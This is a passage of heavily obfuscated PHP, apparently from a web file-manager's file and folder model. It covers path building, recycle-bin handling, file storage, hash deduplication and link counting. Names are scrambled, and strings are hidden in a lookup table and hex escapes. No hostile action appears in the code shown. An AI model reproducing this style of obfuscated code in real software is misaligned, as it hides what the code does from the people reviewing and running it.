$½‹´ğãü[$Úš»äÊ½[487]][$Úš»äÊ½[581]] = rtrim($Ô÷Âæ—Ê, $Úš»äÊ½[8]) . $Úš»äÊ½[8]; break; } } unset($½‹´ğãü); } public function groupPathDisplay(&$Œó—úğğ) { $Ö–³¬ñ =& $_SERVER[ìïæ“œî]; if ($Œó—úğğ[$Ö–³¬ñ[190]] != self::TYPE_GROUP) { return; } $ì©íÕ€ = Model($Ö–³¬ñ[585])->getInfo($Œó—úğğ[$Ö–³¬ñ[569]]); $–÷ÜÊã¨ = $this->parentLevelArray($ì©íÕ€[$Ö–³¬ñ[584]]); $¿İÖ¨û¢ = $Ö–³¬ñ[12]; foreach ($–÷ÜÊã¨ as $€øûƒÔ¯) { $¡´®ıë© = Model($Ö–³¬ñ[585])->getInfo($€øûƒÔ¯); $¿İÖ¨û¢ .= $¡´®ıë©[$Ö–³¬ñ[90]][$Ö–³¬ñ[193]] . $Ö–³¬ñ[50]; } $Œó—úğğ[$Ö–³¬ñ[586]] = $ì©íÕ€[$Ö–³¬ñ[192]]; $Œó—úğğ[$Ö–³¬ñ[587]] = $ì©íÕ€[$Ö–³¬ñ[584]]; $Œó—úğğ[$Ö–³¬ñ[588]] = $ì©íÕ€[$Ö–³¬ñ[589]]; $Œó—úğğ[$Ö–³¬ñ[590]] = $¿İÖ¨û¢ . $ì©íÕ€[$Ö–³¬ñ[90]][$Ö–³¬ñ[193]]; } protected function _listAppendPath(&$üÄ¶¦íÄ, $©½‰Ë• = false) { $±êèî“· =& $_SERVER[ìïæ“œî]; static $ŸˆùÜúş = array(); $öëöêĞô = array(); $°ßÉ°¯ß = array(); if ($©½‰Ë•) { return $ŸˆùÜúş; } foreach ($üÄ¶¦íÄ as &$íªë«Çá) { $‚—ÒåæÜ = $íªë«Çá[$±êèî“·[193]]; if ($íªë«Çá[$±êèî“·[485]] == $±êèî“·[91] && $íªë«Çá[$±êèî“·[192]] != 0) { $ŸˆùÜúş[$‚—ÒåæÜ] = $íªë«Çá[$±êèî“·[32]]; } if ($íªë«Çá[$±êèî“·[485]] == $±êèî“·[91] && $íªë«Çá[$±êèî“·[192]] == 0) { $ŸˆùÜúş[$‚—ÒåæÜ] = $this->_listAppendPathRoot($íªë«Çá, array()); } if (isset($°ßÉ°¯ß[$íªë«Çá[$±êèî“·[584]]])) { continue; } $°ßÉ°¯ß[$íªë«Çá[$±êèî“·[584]]] = !0; $ê®ÛÉÈ = $this->parentLevelArray($íªë«Çá[$±êèî“·[584]]); foreach ($ê®ÛÉÈ as $ÒôêÜÏõ => $æ²ËıÔ…) { if (isset($ŸˆùÜúş[$æ²ËıÔ…])) { continue; } if ($ÒôêÜÏõ == 0) { $ŸˆùÜúş[$æ²ËıÔ…] = $this->_listAppendPathRoot($íªë«Çá, $ê®ÛÉÈ); } if ($ÒôêÜÏõ != 0) { $öëöêĞô[] = $æ²ËıÔ…; } } } unset($íªë«Çá); $öëöêĞô = array_unique($öëöêĞô); if (count($öëöêĞô) > 0) { $ŞŒ¸¿“ = array($±êèî“·[491] => array($±êèî“·[492], $öëöêĞô)); if (count($öëöêĞô) == 1) { $–ãõ¥É = $this->sourceInfo($öëöêĞô[0]); $¥øæÑ¡‰ = is_array($–ãõ¥É) ? array($–ãõ¥É) : !1; } else { $¥øæÑ¡‰ = $this->field($±êèî“·[591])->where($ŞŒ¸¿“)->select(); } if (!$¥øæÑ¡‰) { $¥øæÑ¡‰ = array(); } foreach ($¥øæÑ¡‰ as $Å‚ôßÔë) { $ŸˆùÜúş[$Å‚ôßÔë[$±êèî“·[193]]] = $Å‚ôßÔë[$±êèî“·[32]]; } } $ĞÇ¦äÛ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $É™µ†âË = array(); foreach ($üÄ¶¦íÄ as &$íªë«Çá) { $Ï±š°ÏÒ = $íªë«Çá[$±êèî“·[584]]; $ô¥Ó¨˜Ø = $±êèî“·[12]; if (isset($É™µ†âË[$Ï±š°ÏÒ])) { $ô¥Ó¨˜Ø = $É™µ†âË[$Ï±š°ÏÒ]; } else { $ê®ÛÉÈ = $this->parentLevelArray($íªë«Çá[$±êèî“·[584]]); foreach ($ê®ÛÉÈ as $ÒôêÜÏõ => $æ²ËıÔ…) { if (isset($ŸˆùÜúş[$æ²ËıÔ…])) { $ô¥Ó¨˜Ø .= $ŸˆùÜúş[$æ²ËıÔ…] . $±êèî“·[8]; } } $É™µ†âË[$Ï±š°ÏÒ] = $ô¥Ó¨˜Ø; } $ô¥Ó¨˜Ø .= $íªë«Çá[$±êèî“·[32]]; if ($íªë«Çá[$±êèî“·[485]] == $±êèî“·[91]) { $ô¥Ó¨˜Ø .= $±êèî“·[8]; } $íªë«Çá[$±êèî“·[582]] = str_replace($±êèî“·[592], $±êèî“·[8], $ô¥Ó¨˜Ø); if ($íªë«Çá[$±êèî“·[192]] == $±êèî“·[228]) { $íªë«Çá[$±êèî“·[32]] = trim($ŸˆùÜúş[$íªë«Çá[$±êèî“·[193]]], $±êèî“·[8]); $íªë«Çá[$±êèî“·[582]] = $íªë«Çá[$±êèî“·[32]] . $±êèî“·[8]; } if (intval($íªë«Çá[$±êèî“·[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($íªë«Çá, $ê®ÛÉÈ, $ĞÇ¦äÛ); } } unset($íªë«Çá); return $üÄ¶¦íÄ; } private function _listAppendPathRecycle(&$½„ÛÒ, $¶„ä«Â, $Á»Ÿãî¶) { $ã‘˜€‡Ğ =& $_SERVER[ìïæ“œî]; if (!in_array($Á»Ÿãî¶, $¶„ä«Â) && $½„ÛÒ[$ã‘˜€‡Ğ[193]] != $Á»Ÿãî¶) { return; } $‘ˆ°ì«Ÿ = explode($ã‘˜€‡Ğ[8], trim($½„ÛÒ[$ã‘˜€‡Ğ[582]], $ã‘˜€‡Ğ[8])); $ìÄ¨Ì‰ = implode($ã‘˜€‡Ğ[8], array_slice($‘ˆ°ì«Ÿ, 2)); $½„ÛÒ[$ã‘˜€‡Ğ[582]] = $ã‘˜€‡Ğ[8] . LNG($ã‘˜€‡Ğ[593]) . $ã‘˜€‡Ğ[8] . ltrim($ìÄ¨Ì‰, $ã‘˜€‡Ğ[8]); $½„ÛÒ[$ã‘˜€‡Ğ[584]] = $ã‘˜€‡Ğ[594] . implode($ã‘˜€‡Ğ[50], array_slice($¶„ä«Â, 1)) . $ã‘˜€‡Ğ[50]; if ($½„ÛÒ[$ã‘˜€‡Ğ[193]] == $Á»Ÿãî¶) { $½„ÛÒ[$ã‘˜€‡Ğ[584]] = $ã‘˜€‡Ğ[594]; $½„ÛÒ[$ã‘˜€‡Ğ[192]] = $ã‘˜€‡Ğ[228]; $½„ÛÒ[$ã‘˜€‡Ğ[32]] = LNG($ã‘˜€‡Ğ[593]); } $½„ÛÒ[$ã‘˜€‡Ğ[595]] = $ã‘˜€‡Ğ[596]; } protected function _listAppendPathRoot(&$İ©ÃŸÌ, $ËûîÒ„Ò) { $´Ï†£Ó =& $_SERVER[ìïæ“œî]; static $›ìõíÛ = false; $×ÍÂ¶Ù = $´Ï†£Ó[12]; if ($İ©ÃŸÌ[$´Ï†£Ó[190]] == self::TYPE_USER) { if ($İ©ÃŸÌ[$´Ï†£Ó[569]] == USER_ID) { $×ÍÂ¶Ù = LNG($´Ï†£Ó[597]); if ($›ìõíÛ === !1) { $À ¬ìŒß = Model($´Ï†£Ó[598])->getInfoFull(USER_ID); $›ìõíÛ = _get($À ¬ìŒß, $´Ï†£Ó[599], $´Ï†£Ó[12]); } if ($ËûîÒ„Ò && $ËûîÒ„Ò[0] == $›ìõíÛ || !$ËûîÒ„Ò && $İ©ÃŸÌ[$´Ï†£Ó[193]] == $›ìõíÛ) { $×ÍÂ¶Ù = LNG($´Ï†£Ó[600]); $İ©ÃŸÌ[$´Ï†£Ó[601]] = $´Ï†£Ó[602]; } if (!$ËûîÒ„Ò) { $İ©ÃŸÌ[$´Ï†£Ó[32]] = $×ÍÂ¶Ù; } } else { $İ©ÃŸÌ[$´Ï†£Ó[603]] = Model($´Ï†£Ó[577])->getInfoSimpleOuter($İ©ÃŸÌ[$´Ï†£Ó[569]]); $×ÍÂ¶Ù = LNG($´Ï†£Ó[604]) . $´Ï†£Ó[176] . $İ©ÃŸÌ[$´Ï†£Ó[603]][$´Ï†£Ó[32]] . $´Ï†£Ó[178]; } } else { if ($İ©ÃŸÌ[$´Ï†£Ó[190]] == self::TYPE_GROUP) { $ğËŒß§± = Model($´Ï†£Ó[585])->getInfoSimple($İ©ÃŸÌ[$´Ï†£Ó[569]]); $×ÍÂ¶Ù = $ğËŒß§±[$´Ï†£Ó[32]]; } else { if ($İ©ÃŸÌ[$´Ï†£Ó[190]] == self::TYPE_SYSTEM) { $×ÍÂ¶Ù = $´Ï†£Ó[605]; } } } $×ÍÂ¶Ù = $×ÍÂ¶Ù ? $´Ï†£Ó[8] . $×ÍÂ¶Ù . $´Ï†£Ó[8] : $´Ï†£Ó[8]; return $×ÍÂ¶Ù; } protected function _listAppendUser(&$ÁŠ‚âû­) { $¦Â¯ÔÓ€ =& $_SERVER[ìïæ“œî]; $ëÓ·Å­ = array_to_keyvalue($ÁŠ‚âû­, $¦Â¯ÔÓ€[12], $¦Â¯ÔÓ€[527]); $½ÑİÏŒÍ = array_to_keyvalue($ÁŠ‚âû­, $¦Â¯ÔÓ€[12], $¦Â¯ÔÓ€[529]); $Åğ›ğœê = array_merge($ëÓ·Å­, $½ÑİÏŒÍ); $Ï•Ÿí‰ = Model($¦Â¯ÔÓ€[598])->userListInfo($Åğ›ğœê); foreach ($ÁŠ‚âû­ as &$“Ü­®„¬) { $®èöÆ“© = $“Ü­®„¬[$¦Â¯ÔÓ€[527]]; $“Ü­®„¬[$¦Â¯ÔÓ€[527]] = $Ï•Ÿí‰[$®èöÆ“©] ? $Ï•Ÿí‰[$®èöÆ“©] : !1; $®èöÆ“© = $“Ü­®„¬[$¦Â¯ÔÓ€[529]]; $“Ü­®„¬[$¦Â¯ÔÓ€[529]] = $Ï•Ÿí‰[$®èöÆ“©] ? $Ï•Ÿí‰[$®èöÆ“©] : !1; if (_get($“Ü­®„¬, $¦Â¯ÔÓ€[606], 0)) { $Á©¿´›¥ = $GLOBALS[$¦Â¯ÔÓ€[6]][$¦Â¯ÔÓ€[92]][$¦Â¯ÔÓ€[607]]; if ($“Ü­®„¬[$¦Â¯ÔÓ€[539]][$¦Â¯ÔÓ€[608]] <= time() - $Á©¿´›¥) { $this->metaSet($“Ü­®„¬[$¦Â¯ÔÓ€[193]], $¦Â¯ÔÓ€[609], null); $this->metaSet($“Ü­®„¬[$¦Â¯ÔÓ€[193]], $¦Â¯ÔÓ€[608], null); unset($“Ü­®„¬[$¦Â¯ÔÓ€[539]][$¦Â¯ÔÓ€[609]]); continue; } $åÒúó½Â = $“Ü­®„¬[$¦Â¯ÔÓ€[539]][$¦Â¯ÔÓ€[609]]; $“Ü­®„¬[$¦Â¯ÔÓ€[539]][$¦Â¯ÔÓ€[610]] = Model($¦Â¯ÔÓ€[598])->getInfoSimpleOuter($åÒúó½Â); } } unset($“Ü­®„¬); } public function parentLevelArray($Ñããñğ­) { $æ²ö‘¢ø =& $_SERVER[ìïæ“œî]; $Ñããñğ­ = explode($æ²ö‘¢ø[50], trim($Ñããñğ­, $æ²ö‘¢ø[50])); return array_remove_value($Ñããñğ­, $æ²ö‘¢ø[228]); } public function listAll($ªÔˆû) { $°çµº¬© =& $_SERVER[ìïæ“œî]; $²§òÄÅÌ = $this->sourceInfo($ªÔˆû); $İã°¸Ş = array($°çµº¬©[611] => array($°çµº¬©[612], $²§òÄÅÌ[$°çµº¬©[584]] . $ªÔˆû . $°çµº¬©[613]), $°çµº¬©[614] => 0); $¥äƒ“„ = $°çµº¬©[615]; $…ê Øï‘ = "\x4c\x45\x46\124\40\112\117\x49\116\40{$this->tablePrefix}\x69\157\137\x66\x69\154\x65\x20\x66\151\154\x65\x20\157\x6e\x20\163\x6f\x75\x72\x63\145\56\146\x69\x6c\145\111\104\40\x3d\40\146\x69\x6c\145\56\x66\151\x6c\145\111\x44"; $ÀãÁ†®‰ = $this->alias($°çµº¬©[519])->field($¥äƒ“„)->where($İã°¸Ş)->join($…ê Øï‘)->select(); $this->_listAppendAuth($ÀãÁ†®‰); $this->_listAppendUser($ÀãÁ†®‰); $this->_listAppendPath($ÀãÁ†®‰); $ÀãÁ†®‰ = array_to_keyvalue($ÀãÁ†®‰, $°çµº¬©[193]); $Áü²¯²‡ = "\x2f{$²§òÄÅÌ[$°çµº¬©[32]]}\x2f"; $Áü²¯²‡ = $Áü²¯²‡ == $°çµº¬©[592] ? $°çµº¬©[8] : $Áü²¯²‡; $ôÕïş» = array(); foreach ($ÀãÁ†®‰ as $âÆÆ¼ÊÏ => $âøÙŞË) { $½š‹Å·ş = $this->parentLevelArray($âøÙŞË[$°çµº¬©[584]]); array_shift($½š‹Å·ş); $´©Ì“ = $Áü²¯²‡; for ($–‘ºÜÈ× = 0; $–‘ºÜÈ× < count($½š‹Å·ş); $–‘ºÜÈ×++) { $´©Ì“ .= $ÀãÁ†®‰[$½š‹Å·ş[$–‘ºÜÈ×]][$°çµº¬©[32]] . $°çµº¬©[8]; } $´©Ì“ .= $âøÙŞË[$°çµº¬©[32]]; if ($âøÙŞË[$°çµº¬©[485]]) { $´©Ì“ .= $°çµº¬©[8]; } $®÷ªƒĞü = array($°çµº¬©[495] => str_replace($°çµº¬©[592], $°çµº¬©[8], str_replace($°çµº¬©[592], $°çµº¬©[8], str_replace($°çµº¬©[592], $°çµº¬©[8], $´©Ì“))), $°çµº¬©[616] => intval($âøÙŞË[$°çµº¬©[485]]), $°çµº¬©[617] => intval($âøÙŞË[$°çµº¬©[79]]), $°çµº¬©[88] => intval($âøÙŞË[$°çµº¬©[88]]), $°çµº¬©[90] => $this->pathInfoFilter($âøÙŞË)); if (!$®÷ªƒĞü[$°çµº¬©[485]]) { $®÷ªƒĞü[$°çµº¬©[541]] = $âøÙŞË[$°çµº¬©[541]]; } $ôÕïş»[] = $®÷ªƒĞü; } $ôÕïş» = array_sort_by($ôÕïş», $°çµº¬©[87]); return $ôÕïş»; } } goto FÃ—”É‹½ˆ; AÙ±‡·Ã¿¤: class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\146\x69\154\145\137\x63\157\156\164\145\156\x74\163"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\x65\x54\x69\155\145", "\164\x69\155\x65", "\151\156\x73\x65\x72\x74", "\146\x75\156\x63\164\151\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\x69\154\145"; protected $tableMeta = array("\x74\x61\142\154\x65\116\141\155\145" => "\x69\157\x5f\146\151\x6c\x65\137\x6d\x65\164\141", "\x6d\145\x74\x61\106\151\x65\x6c\144" => "\x66\151\x6c\145\111\x44"); public function fileInfo($Ü„ìŠ) { $†¨°±–ˆ =& $_SERVER[ìïæ“œî]; static $¶á•Şü® = array(); if (!isset($¶á•Şü®[$Ü„ìŠ])) { $‹ºèß = $†¨°±–ˆ[1996]; $Õ¥ò²ş„ = Model($†¨°±–ˆ[544])->field($‹ºèß)->where(array($†¨°±–ˆ[542] => $Ü„ìŠ))->find(); $¶á•Şü®[$Ü„ìŠ] = $Õ¥ò²ş„; } return $¶á•Şü®[$Ü„ìŠ]; } public function addFileByContent($ãŠÓ½±Î = '', $”úÛ¿‚ = '') { $€Â½ªÜ =& $_SERVER[ìïæ“œî]; $Í¡•«ÉÙ = TEMP_PATH . $€Â½ªÜ[1997]; if (!is_dir($Í¡•«ÉÙ)) { mk_dir($Í¡•«ÉÙ); } $‡ÂÖ»ÉÔ = $Í¡•«ÉÙ . $€Â½ªÜ[1998] . rand_string(16); file_put_contents($‡ÂÖ»ÉÔ, $ãŠÓ½±Î); $ããã¼¯§ = $this->addFile($‡ÂÖ»ÉÔ, $”úÛ¿‚, !0); if (file_exists($‡ÂÖ»ÉÔ)) { @unlink($‡ÂÖ»ÉÔ); } return $ããã¼¯§; } public function createFileName($•ß£öÓ“, $¿È½±î¿ = false, $æ‹åÕĞÓ = false) { $¶—³ê®‚ =& $_SERVER[ìïæ“œî]; $§÷ºÔˆÚ = IO::init($¶—³ê®‚[8]); $úß–½Æ‰ = $this->makeFilePath($•ß£öÓ“, $§÷ºÔˆÚ, $¿È½±î¿, $æ‹åÕĞÓ); $ªÀª¶ìæ = $§÷ºÔˆÚ->pathFather($úß–½Æ‰); static $Äæã± = false; $Àò´–Šº = $¶—³ê®‚[1999] . md5($ªÀª¶ìæ); if (!$Äæã± && !Cache::get($Àò´–Šº)) { $Äæã± = !0; $Ãù©ÜËü = IO::mkdir($ªÀª¶ìæ); if (!IO::exist($Ãù©ÜËü . $¶—³ê®‚[846])) { IO::mkfile($Ãù©ÜËü . $¶—³ê®‚[846]); } Cache::set($Àò´–Šº, 1, 3600 * 2); } return $úß–½Æ‰; } public function makeFilePath($£¥ÊİÄ‰, $½È›Õˆ‰, $ø•şùÕ  = false, $Æ¯¸—ª = false) { $Ü¬±Õƒ =& $_SERVER[ìïæ“œî]; $Î€Ï›ŒŠ = Model($Ü¬±Õƒ[819])->get($Ü¬±Õƒ[2000]); $Øôá”µ¢ = KodIO::defaultIO() . date($Ü¬±Õƒ[2001]); $¨Í”§© = $Øôá”µ¢ . rand_string(5) . short_id(100); $£¥ÊİÄ‰ = str_replace($Ü¬±Õƒ[8], $Ü¬±Õƒ[11], KodIO::clear($£¥ÊİÄ‰)); $µ¨ÄÇ×í = $½È›Õˆ‰->ext($£¥ÊİÄ‰); if (!$£¥ÊİÄ‰) { $Î€Ï›ŒŠ = $Ü¬±Õƒ[825]; } switch ($Î€Ï›ŒŠ) { case $Ü¬±Õƒ[2002]: if ($µ¨ÄÇ×í) { $¨Í”§© = $¨Í”§© . $Ü¬±Õƒ[10] . $µ¨ÄÇ×í; } if ($µ¨ÄÇ×í == $Ü¬±Õƒ[1938]) { $¨Í”§© .= $Ü¬±Õƒ[1268]; } break; case $Ü¬±Õƒ[2003]: $§ºû¶Ì¤ = Model($Ü¬±Õƒ[819])->get($Ü¬±Õƒ[820]); $¾Çûµ¸ç = substr(md5($Ü¬±Õƒ[821] . $§ºû¶Ì¤ . date($Ü¬±Õƒ[798])), 0, 8); $¦ÔßÏ› = KodIO::defaultDriver(); $Øôá”µ¢ = $Ü¬±Õƒ[1299] . $¦ÔßÏ›[$Ü¬±Õƒ[475]] . $Ü¬±Õƒ[484] . date($Ü¬±Õƒ[2004]) . $¾Çûµ¸ç . $Ü¬±Õƒ[8]; if ($µ¨ÄÇ×í == $Ü¬±Õƒ[1938]) { $£¥ÊİÄ‰ .= $Ü¬±Õƒ[1268]; } $Æ“‡ä•ê = $Ü¬±Õƒ[2005] . $Øôá”µ¢ . $£¥ÊİÄ‰; CacheLock::lock($Æ“‡ä•ê); $¨Í”§© = $Øôá”µ¢ . $£¥ÊİÄ‰; if (IO::exist($Øôá”µ¢ . $£¥ÊİÄ‰)) { $¼Å§ = substr($£¥ÊİÄ‰, 0, strlen($£¥ÊİÄ‰) - strlen($µ¨ÄÇ×í)); $ÜúÇÉ¸£ = $Æ¯¸—ª ? substr($Æ¯¸—ª, 0, 5) : ($ø•şùÕ  ? substr($ø•şùÕ , 0, 5) : rand_string(5)); $¨Í”§© = $Øôá”µ¢ . $¼Å§ . $ÜúÇÉ¸£; if ($µ¨ÄÇ×í) { $¨Í”§© = $¨Í”§© . $Ü¬±Õƒ[10] . $µ¨ÄÇ×í; } } if (IO::isOsDriver($¨Í”§©) && !IO::isUploadServer($¨Í”§©)) { if (IO::exist($¨Í”§©)) { return $¨Í”§©; } $•îÊÃŞš = IO::setContent($¨Í”§©, $Ü¬±Õƒ[12]); if (!$•îÊÃŞš) { show_json($Ü¬±Õƒ[2006], !1); } } CacheLock::unlock($Æ“‡ä•ê); break; case $Ü¬±Õƒ[825]: break; default: break; } return $¨Í”§©; } public function addFileByRemote($°–¬Ó¯›, $üœ€ÊÖ›, $Ó‰ËÏèå = array()) { $í–Ÿû¼³ =& $_SERVER[ìïæ“œî]; if (!IO::exist($°–¬Ó¯›)) { return !1; } $Æà¥Íîˆ = $Ó‰ËÏèå[$í–Ÿû¼³[547]] ? $Ó‰ËÏèå[$í–Ÿû¼³[547]] : $í–Ÿû¼³[12]; $†™èÖï = IO::hashMd5($°–¬Ó¯›, $Æà¥Íîˆ); $ñ è = KodIO::defaultDriver(); $îÔø²åò = array($í–Ÿû¼³[617] => IO::size($°–¬Ó¯›), $í–Ÿû¼³[2007] => 1, $í–Ÿû¼³[494] => $üœ€ÊÖ›, $í–Ÿû¼³[857] => $ñ è[$í–Ÿû¼³[475]], $í–Ÿû¼³[495] => $°–¬Ó¯›, $í–Ÿû¼³[2008] => $Ó‰ËÏèå[$í–Ÿû¼³[672]] ? $Ó‰ËÏèå[$í–Ÿû¼³[672]] : IO::hashSimple($°–¬Ó¯›), $í–Ÿû¼³[2009] => $†™èÖï ? $†™èÖï : $Æà¥Íîˆ); if ($œ˜›Ú¾¥ = $this->addFileCheckExist($îÔø²åò[$í–Ÿû¼³[672]], $îÔø²åò[$í–Ÿû¼³[547]], $îÔø²åò[$í–Ÿû¼³[79]])) { return $œ˜›Ú¾¥; } return $this->addFileData($îÔø²åò); } private function addFileData($ÊôŸÒ–») { $ã“ğ™¯ =& $_SERVER[ìïæ“œî]; if (!$ÊôŸÒ–») { return !1; } $ÊôŸÒ–»[$ã“ğ™¯[79]] = intval($ÊôŸÒ–»[$ã“ğ™¯[79]]); if (!$ÊôŸÒ–»[$ã“ğ™¯[79]] && strlen($ÊôŸÒ–»[$ã“ğ™¯[672]]) > 32) { $ÊôŸÒ–»[$ã“ğ™¯[79]] = intval(substr($ÊôŸÒ–»[$ã“ğ™¯[672]], 32)); } $Úò½†¦ = $this->add($ÊôŸÒ–»); return $this->find($Úò½†¦); } public function addFile($ÒÙ½îôÍ, $¬Å´£»µ, $´ºÌ« = false) { $ÏÖİ…å =& $_SERVER[ìïæ“œî]; $€İ¬§ = IO::hashSimple($ÒÙ½îôÍ); $îˆÇˆ…Ÿ = IO::size($ÒÙ½îôÍ); $àÚô ®Ö = $îˆÇˆ…Ÿ <= 1024 * 1024 * 10 ? IO::hashMd5($ÒÙ½îôÍ) : $ÏÖİ…å[12]; $’¯ãµª’ = $ÏÖİ…å[2010] . $€İ¬§; CacheLock::lock($’¯ãµª’); if ($àÚô ®Ö && $€İ¬§) { $Ôáà”¶— = $this->addFileCheckExist($€İ¬§, $àÚô ®Ö, $îˆÇˆ…Ÿ); if ($Ôáà”¶—) { CacheLock::unlock($’¯ãµª’); return $Ôáà”¶—; } } $ÒæèŠ¶™ = $this->addFileMake($ÒÙ½îôÍ, $îˆÇˆ…Ÿ, $€İ¬§, $àÚô ®Ö, $¬Å´£»µ, $´ºÌ«); $·®¦¦—½ = $this->addFileData($ÒæèŠ¶™); CacheLock::unlock($’¯ãµª’); if (!$àÚô ®Ö && $·®¦¦—½) { $this->fileMd5Check($·®¦¦—½); } return $·®¦¦—½; } public function fileMd5Check($õ‚Ì†ú) { $Ã¤š‘˜Ö =& $_SERVER[ìïæ“œî]; $Å›©úÁº = array($õ‚Ì†ú[$Ã¤š‘˜Ö[541]], $õ‚Ì†ú[$Ã¤š‘˜Ö[87]]); $­¦Ñå—ú = $Ã¤š‘˜Ö[2011] . $õ‚Ì†ú[$Ã¤š‘˜Ö[87]]; $‚õ»¾ºÁ = $Ã¤š‘˜Ö[2012] . $õ‚Ì†ú[$Ã¤š‘˜Ö[541]]; TaskQueue::add($Ã¤š‘˜Ö[2013], $Å›©úÁº, $­¦Ñå—ú, $‚õ»¾ºÁ); } public function fileMd5Set($ÛğÃé³, $•É‚çÑã) { $ãÆÙƒáê =& $_SERVER[ìïæ“œî]; $Ğ÷€Ğ£Ï = $this->find($ÛğÃé³); if (!$Ğ÷€Ğ£Ï || $Ğ÷€Ğ£Ï[$ãÆÙƒáê[547]]) { return; } $Íá‚×Æ = IO::hashMd5($•É‚çÑã); if (!$Íá‚×Æ) { return $ãÆÙƒáê[12]; } $this->where(array($ãÆÙƒáê[541] => $ÛğÃé³))->save(array($ãÆÙƒáê[547] => $Íá‚×Æ)); } public function addFileMake($Á¶²Âì©, $‰¡¸ÈêÒ, $ºõ»ıµ˜, $§ƒ­–ïÈ, $Üæ‘Üğ, $¯¯ˆ‘€‚) { $ÕÎ„‘¶Æ =& $_SERVER[ìïæ“œî]; $âˆøâ = $this->createFileName($Üæ‘Üğ, $ºõ»ıµ˜, $§ƒ­–ïÈ); $È“Ê­èõ = get_path_father($âˆøâ); $µäÍ±¤ = get_path_this($âˆøâ); if ($¯¯ˆ‘€‚) { $Éöù³ä™ = IO::move($Á¶²Âì©, $È“Ê­èõ, !1, $µäÍ±¤); } else { $Éöù³ä™ = IO::copy($Á¶²Âì©, $È“Ê­èõ, !1, $µäÍ±¤); } if (!$Éöù³ä™) { return !1; } $¥Ç¸ê• = KodIO::defaultDriver(); $Ğ·Ëª = array($ÕÎ„‘¶Æ[617] => $‰¡¸ÈêÒ, $ÕÎ„‘¶Æ[2007] => 1, $ÕÎ„‘¶Æ[494] => $Üæ‘Üğ, $ÕÎ„‘¶Æ[857] => $¥Ç¸ê•[$ÕÎ„‘¶Æ[475]], $ÕÎ„‘¶Æ[495] => $âˆøâ, $ÕÎ„‘¶Æ[2008] => $ºõ»ıµ˜, $ÕÎ„‘¶Æ[2009] => $§ƒ­–ïÈ); return $Ğ·Ëª; } public function addFileCheckExist($¹º®äÌÄ, $ï·èš³Ï, $†û’âÒ…) { $ÔÕŞÔæƒ =& $_SERVER[ìïæ“œî]; $ö©¿€Øƒ = $this->findByHash($¹º®äÌÄ, $ï·èš³Ï); if (!$ö©¿€Øƒ) { return !1; } $¿“·ÜÆÌ = array($ÔÕŞÔæƒ[2007] => intval($ö©¿€Øƒ[$ÔÕŞÔæƒ[2014]]) + 1, $ÔÕŞÔæƒ[617] => $†û’âÒ…); $this->where(array($ÔÕŞÔæƒ[542] => $ö©¿€Øƒ[$ÔÕŞÔæƒ[541]]))->save($¿“·ÜÆÌ); return $ö©¿€Øƒ; } public function remove($¿±ãì°ş) { $this->linkCountChange($¿±ãì°ş, !1); $this->clearEmpty(); return !0; } public function linkAdd($¦áÖ©áÄ) { $this->linkCountChange($¦áÖ©áÄ, !0); } public function linkCountChange($ÌÏŠú‡™, $§†¹¯¸²) { $—èåíÒİ =& $_SERVER[ìïæ“œî]; if (!$ÌÏŠú‡™) { return; } if (!is_array($ÌÏŠú‡™)) { $ÌÏŠú‡™ = array($ÌÏŠú‡™); } $«ôŠ¤² = array(); foreach ($ÌÏŠú‡™ as $¡áûçÂá) { $ˆõŸ‚ÀÇ = $¡áûçÂá . $—èåíÒİ[12]; if (!$«ôŠ¤²[$ˆõŸ‚ÀÇ]) { $«ôŠ¤²[$ˆõŸ‚ÀÇ] = 0; } $«ôŠ¤²[$ˆõŸ‚ÀÇ]++; } $şü«Ïˆ¶ = array(); foreach ($«ôŠ¤² as $¡áûçÂá => $ŞõõàÕ) { $ˆõŸ‚ÀÇ = $ŞõõàÕ . $—èåíÒİ[12]; if (!$şü«Ïˆ¶[$ˆõŸ‚ÀÇ]) { $şü«Ïˆ¶[$ˆõŸ‚ÀÇ] = array(); } $şü«Ïˆ¶[$ˆõŸ‚ÀÇ][] = $¡áûçÂá; } foreach ($şü«Ïˆ¶ as $ŞõõàÕ => $Ç€£„˜ù) { if (!$Ç€£„˜ù) { continue; } $ŞõõàÕ = $§†¹¯¸² ? $ŞõõàÕ : -intval($ŞõõàÕ); $€Ÿğº£‰ = array($—èåíÒİ[541] => array($—èåíÒİ[7], $Ç€£„˜ù)); if ($ŞõõàÕ < 0) { $€Ÿğº£‰[$—èåíÒİ[2014]] = array($—èåíÒİ[1070], abs($ŞõõàÕ)); } $this->where($€Ÿğº£‰)->setAdd($—èåíÒİ[2014], $ŞõõàÕ); } } public function findByHash($ŞÂÚìï×, $ˆÄßÍƒ = false) { $—êÉ—Ì­ =& $_SERVER[ìïæ“œî]; if (!$ŞÂÚìï× && !$ˆÄßÍƒ) { return !1; } $ç»–ôÔ­ = array($—êÉ—Ì­[2008] => $ŞÂÚìï×); if ($ˆÄßÍƒ) { $ç»–ôÔ­ = array($—êÉ—Ì­[2009] => $ˆÄßÍƒ); } return $this->order($—êÉ—Ì­[2015])->where($ç»–ôÔ­)->find(); } public function clearEmpty($§â•¥Ãœ = 0) { $øğ»øÓµ =& $_SERVER[ìïæ“œî]; $’¶›İ¿ = time() - 3600 * 24 * $§â•¥Ãœ; $ä‘ì´ø = $øğ»øÓµ[2016] . $’¶›İ¿; $Ğ®Ôˆùœ = $this->where($ä‘ì´ø)->select(); if (!$Ğ®Ôˆùœ) { return; } $Ê­§øàÓ = new Task($øğ»øÓµ[2017], $øğ»øÓµ[12], count($Ğ®Ôˆùœ)); foreach ($Ğ®Ôˆùœ as $Òó‡Í£Õ) { $Ê­§øàÓ->update(1); $this->resetFile($Òó‡Í£Õ); } $Ê­§øàÓ->end(); } public function resetFile($øšàï¸) { $³°½ºÈ =& $_SERVER[ìïæ“œî]; $½­‡¾• = array($³°½ºÈ[542] => $øšàï¸[$³°½ºÈ[541]]); $ğ‚ªü–È = Model($³°½ºÈ[1394])->where($½­‡¾•)->count(); $Æ¡´ŒÏ— = Model($³°½ºÈ[2018])->where($½­‡¾•)->count(); $ ”°ˆğÀ = intval($ğ‚ªü–È) + intval($Æ¡´ŒÏ—); if ($ ”°ˆğÀ == 0) { IO::remove($øšàï¸[$³°½ºÈ[87]]); Model($³°½ºÈ[2019])->delete($øšàï¸[$³°½ºÈ[541]]); 